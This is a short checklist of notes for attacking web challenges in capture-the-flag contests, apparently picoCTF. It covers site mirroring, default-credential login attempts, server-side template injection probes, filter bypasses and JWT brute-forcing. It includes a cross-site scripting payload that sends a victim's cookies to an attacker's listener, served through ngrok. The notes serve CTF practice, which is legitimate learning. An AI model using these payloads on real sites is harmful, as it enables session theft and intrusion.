- Go through robots.txt and sitemap.xml
- Check if it shows Server: and if anything's vulnerable



- If it's reading through source or something do:
	- wget -m http://ctfSite.com && wget http://ctfSite.com/robots.txt && grep -R "picoCTF"
		- "" could be "ctfName" or "{" or "}" or "picoCTF{.\*?}"


- Facing login page:
	- Try admin:admin
	- Try signup as admin:admin
	- Login as a normal user and then try to retrieve cookie through a posting page like 
			- <script>new Image().src='http://listening?c='+document.cookie</script>
			- Note: You could use ngrok to host for free to receive the bug by doing 
				- python3 -m http.server 8008
				- ngrok http 8008

- Facing an text to pdf functionlity where your details get turned into pdf to view
	- In burp, enable binary in scope and try to find out the version of the pdf converter and look for previous cve's to exploit and google around
Facing giving many details about yourself:
	- You could try SSTI by putting this payload in everything:
	- ```      {{8*8}}
	        {{10+10}}             ```


- Facing any comment section, or posting functionality like todo list etc.
	- We can try <h1>hi</h1>
	- Try SSTI polyglots and xss polyglots etc.
	- See if any parameters have values reflected onto the page and try polyglots on them or xss etc. or ssti.
	- Bypass filters in parameters by just doing pop'+'en if popen is blocked etc.
	- In SSTI bypass, convert ls flag.txt to hex \x version for encoding and bypass

- If jwt is used, we could try to brute force it (https://www.youtube.com/watch?v=3LRZsnSyDrQ)